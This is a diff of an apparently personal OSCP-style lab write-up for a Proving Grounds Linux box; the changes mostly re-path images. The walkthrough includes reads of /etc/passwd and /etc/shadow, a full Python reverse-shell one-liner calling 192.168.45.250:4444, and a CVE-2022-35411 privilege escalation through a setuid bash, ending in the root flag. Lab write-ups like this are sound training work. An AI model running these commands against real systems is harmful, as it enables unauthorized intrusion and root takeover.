@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-12
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -74,48 +75,48 @@ PORT     STATE SERVICE  VERSION
 No enumeration conducted
 ## Port 8000 - HTTP (ttyd-alt)
 - Navigated to `http://192.168.215.210:8000`, found `ttyd` service running, and enumerated available directories
-![[Pasted image 20241012094632.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012094632.png]]
 - Ran `cat /etc/passwd` to find other users, and `cat /etc/shadow` to test shadow file
-![[Pasted image 20241012094922.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012094922.png]]
 - Ran `ttyd -h` to view TTYD help, then checked version
-![[Pasted image 20241012095216.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012095216.png]]
 - Ran `ps aux` to identify running processes and identified `python3 /opt/rpy.py` running under `root` - potentially vulnerable to CVE-2022-35411
-![[Pasted image 20241012095732.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012095732.png]]
 - Started netcat listener on port 4444 and created reverse shell with command `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.250",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` 
-![[Pasted image 20241012095951.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012095951.png]]
 - Upgraded shell, uploaded `suid3num.py` from [Anon-Exploiter](https://github.com/Anon-Exploiter/SUID3NUM), and executed python script for no exploitable binaries.
-![[Pasted image 20241012100538.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012100538.png]]
 - Uploaded `linpeas.sh` and executed script
-![[Pasted image 20241012100947.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012100947.png]]
 - Identified sudo version 1.8.3 - potentially vulnerable to CVE-2021-3156
-![[Pasted image 20241012101046.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012101046.png]]
 - Identified vulnerable to CVE-2021-3560
-![[Pasted image 20241012101134.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012101134.png]]
 - Identified process `1045` run by `user` but ppid is `root`
-![[Pasted image 20241012101336.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012101336.png]]
 - Identified potentially vulnerable Pkexec policy for user
-![[Pasted image 20241012101440.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012101440.png]]
 	- Checked `pkexe` binary permissions
-![[Pasted image 20241012103343.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012103343.png]]
 
 ---
 # Exploitation
 
 ## CVE-2021-3560
 - Uploaded `poc.sh` and attempted to exploit Polkit privesc - missing `Accounts service` and `gnome-control-center`
-![[Pasted image 20241012102758.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012102758.png]]
 ## CVE-2023-22809
 - Uploaded `exploit.sh` from [https://github.com/asepsaepdin/CVE-2023-22809/blob/main/exploit.sh] and attempted to exploit `sudo v1.8.3` privesc - do not have `user` password
-![[Pasted image 20241012103104.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012103104.png]]
 ---
 # Privilege Escalation
 ## CVE-2022-35411
 - Modified `rpcpy-exploit.py` from [https://github.com/ehtec/rpcpy-exploit/blob/main/rpcpy-exploit.py] to execute `chmod +s /bin/bash` on target as `root`
-![[Pasted image 20241012111558.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012111558.png]]
 - Ran `python3 rpcpy-exploit.py` on target, then ran `/bin/bash -p` to run Bash as `root`
-![[Pasted image 20241012111709.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012111709.png]]
 - Ran `cat /root/proof.txt` for flag `0d69ed51214ecceb8e06fe516da4785e`
-![[Pasted image 20241012112106.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012112106.png]]
 ---
 # Trophy & Loot
 `root.txt` = `0d69ed51214ecceb8e06fe516da4785e`
